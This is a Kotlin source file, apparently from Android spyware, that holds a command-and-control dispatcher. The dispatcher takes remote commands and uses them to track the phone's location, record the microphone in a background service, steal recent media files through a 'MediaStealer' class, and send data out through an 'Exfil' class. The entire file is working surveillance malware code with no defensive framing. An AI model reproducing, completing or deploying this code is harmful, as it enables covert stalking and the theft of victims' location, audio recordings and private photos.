package com.sp.core.c2

import android.content.Context
import com.sp.core.services.*

object Commands {
    fun dispatch(ctx: Context, cmd: String, args: Map<String, String>) {
        when (cmd) {
            "loc" -> startService(ctx, LocationService::class.java)
            "mic" -> {
                val sec = args["sec"]?.toIntOrNull() ?: 60
                val i = android.content.Intent(ctx, MicRecorder::class.java)
                    .putExtra("seconds", sec)
                if (android.os.Build.VERSION.SDK_INT >= 26)
                    ctx.startForegroundService(i) else ctx.startService(i)
            }
            "media" -> MediaStealer.stealRecent(ctx, args["n"]?.toIntOrNull() ?: 20)
            "ping" -> Exfil.sendLog(ctx, "pong", "{}")
        }
    }
    private fun startService(ctx: Context, cls: Class<*>) {
        val i = android.content.Intent(ctx, cls)
        if (android.os.Build.VERSION.SDK_INT >= 26)
            ctx.startForegroundService(i) else ctx.startService(i)
    }
}